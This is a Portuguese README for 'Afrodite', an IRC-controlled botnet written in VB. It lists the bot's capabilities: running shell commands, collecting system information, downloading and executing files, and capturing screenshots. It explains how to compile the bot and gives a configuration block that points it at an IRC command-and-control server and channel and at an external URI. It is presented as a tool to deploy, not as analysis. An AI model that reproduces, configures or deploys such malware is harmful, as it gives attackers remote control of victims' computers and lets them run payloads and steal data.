# Sobre Afrodite

Afrodite é uma botnet que foi desenvolvida em 2016 com a linguagem vb. Ela se conecta com um servidor irc e transmite mensagens e recebe comandos atrávés de lá.


## Funcionalidades

As funcionalidades da botnet são:

- Realiza comandos ( mesmos comandos do Prompt de comando )
- Captura informações do computador ( Captura sistema operacional, versão processador e arquitetura )
- Baixar arquivos
- Executar arquivos
- Tirar print da tela
 
## Instalação

Compilar no visual studio.

## Como Usar

Alterar as seguintes linhas de configuração do servidor irc.

```
    Dim CONFIG_CANAL As String = "#jhv53gv4HLKHB658"
    Dim CONFIG_SERVER As String = "irc.freenode.net"
    Dim CONFIG_PORT As Int32 = 6667
    Dim CONFIG_URI As String = "http://afrodite.pe.hu/" // Opcional
```

## Contribuições

Gabriel Arcanjo Laranjeira dos Santos

## Licença
[MIT](https://choosealicense.com/licenses/mit/)